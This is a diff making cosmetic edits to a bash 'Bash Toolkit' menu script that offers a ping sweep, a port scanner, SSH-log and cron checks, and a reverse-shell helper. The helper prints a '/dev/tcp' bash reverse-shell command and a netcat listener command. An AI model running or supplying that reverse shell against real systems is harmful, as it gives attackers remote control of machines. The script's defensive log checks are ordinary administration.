@@ -1,14 +1,12 @@
 #!/bin/bash
-
-
 # Bash Toolkit
 
-banner() {
-  echo -e "\ Bash Toolkit"
+banner() { 
+  echo -e "Bash Toolkit"
 }
 
 menu() {
-  echo -e "\n Select an option:"
+  echo -e "\nSelect an option:"
   echo "1) Ping Sweep"
   echo "2) Port Scanner"
   echo "3) Reverse Shell"
@@ -23,7 +21,7 @@ menu() {
 ping_sweep() {
   echo -n "Enter subnet (e.g., 192.168.1): "
   read subnet
-  echo -e "\n🔍 Pinging hosts in $subnet.0/24 ..."
+  echo -e "\nPinging hosts in $subnet.0/24 ..."
   for ip in {1..254}; do
     ping -c 1 -W 1 $subnet.$ip | grep "64 bytes" &>/dev/null && echo "$subnet.$ip is UP" &
   done
@@ -48,38 +46,38 @@ reverse_shell_helper() {
   echo -n "Enter attacker port: "
   read port
 
-  echo -e "\n Bash Reverse Shell command:"
+  echo -e "\nBash Reverse Shell command:"
   echo "bash -i >& /dev/tcp/$attacker_ip/$port 0>&1"
-  echo -e "\n On your listener machine, run:"
+  echo -e "\nOn your listener machine, run:"
   echo "nc -lvnp $port"
 }
 
 # --- Analyze SSH Logins ---
 analyze_ssh_logins() {
-  echo -e "\n Failed SSH login attempts by IP:"
+  echo -e "\nFailed SSH login attempts by IP:"
   grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -nr
 
-  echo -e "\n Successful SSH login IPs:"
+  echo -e "\nSuccessful SSH login IPs:"
   grep "Accepted password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq
 }
 
 # --- Suspicious New Users ---
 new_users_check() {
-  echo -e "\n Home directories (created in last 7 days):"
+  echo -e "\nHome directories (created in last 7 days):"
   find /home -type d -ctime -7
 }
 
 # --- Cron Job Modifications ---
 cron_mod_check() {
-  echo -e "\n Recently modified cron jobs (last 2 days):"
+  echo -e "\nRecently modified cron jobs (last 2 days):"
   find /etc/cron* -type f -mtime -2
 }
 
-# === Main Execution Loop ===
-banner
+# === Main Loop ===
 while true; do
+  banner
   menu
-  read choice
+  read choice 
   case $choice in
     1) ping_sweep ;;
     2) port_scanner ;;
